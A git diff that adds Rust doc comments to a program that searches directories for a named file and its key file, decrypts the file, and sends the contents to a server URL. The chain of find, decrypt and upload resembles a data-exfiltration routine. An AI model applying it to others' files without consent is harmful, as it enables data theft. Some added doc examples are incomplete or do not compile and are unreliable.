@@ -4,13 +4,25 @@ use std::io::{Read, Write};
 use std::path::Path;
 use reqwest::blocking::Client;
 
-/// finds files in function
 /// # Arguments
-/// * start_dir - starting directory 
+/// * `start_dir` - The starting directory to begin the search.
+/// * `target_file` - The name of the target file to find.
+/// * `key_file` - The name of the key file to find.
+///
+/// # Returns
+/// A tuple containing `Option<String>` paths to the target and key files if found, respectively.
+///
 /// # Example
 /// ```
-/// let _x = 7u8;
+/// use std::path::Path;
+/// let start_dir = Path::new(".");
+/// let target_file = "example_target.txt";
+/// let key_file = "example_key.txt";
+/// let (target_path, key_path) = find_files(start_dir, target_file, key_file);
+/// println!("Target file path: {:?}", target_path);
+/// println!("Key file path: {:?}", key_path);
 /// ```
+
 fn find_files(start_dir: &Path, target_file: &str, key_file: &str) -> (Option<String>, Option<String>) {
     let mut target_path = None;
     let mut key_path = None;
@@ -37,6 +49,22 @@ fn find_files(start_dir: &Path, target_file: &str, key_file: &str) -> (Option<St
     (target_path, key_path)
 }
 
+/// Decrypts a file using a specified key file.
+///
+/// # Arguments
+/// * `target_path` - The path to the file to decrypt.
+/// * `key_path` - The path to the key file used for decryption.
+///
+/// # Returns
+/// A `Vec<u8>` containing the decrypted file data.
+///
+/// # Example
+/// ```
+/// let target_path = "path/to/target.txt";
+/// let key_path = "path/to/key.txt";
+/// let decrypted_data = decrypt_file(target_path, key_path);
+/// ```
+
 fn decrypt_file(target_path: &str, key_path: &str) -> Vec<u8> {
     let mut key_file = fs::File::open(key_path).unwrap();
     let mut key = Vec::new();
@@ -50,6 +78,18 @@ fn decrypt_file(target_path: &str, key_path: &str) -> Vec<u8> {
 
     plaintext
 }
+
+/// Sends file data to a specified server URL.
+///
+/// # Arguments
+/// * `data` - The data of the file to send.
+/// * `server_url` - The URL of the server to which the file will be sent.
+///
+/// # Example
+/// ```
+/// let decrypted_data: Vec<u8> = vec![...]; // Assume this is decrypted file data
+/// send_file(&decrypted_data, server_url);
+/// ```
 
 fn send_file(data: &[u8], server_url: &str) {
     let client = Client::new();
@@ -71,6 +111,12 @@ fn send_file(data: &[u8], server_url: &str) {
         }
     }
 }
+
+/// Main function to orchestrate file finding, decryption, and sending.
+///
+/// # Example
+/// Run the program from the command line with the following arguments:
+/// ```
 
 fn main() {
     let args: Vec<String> = env::args().collect();
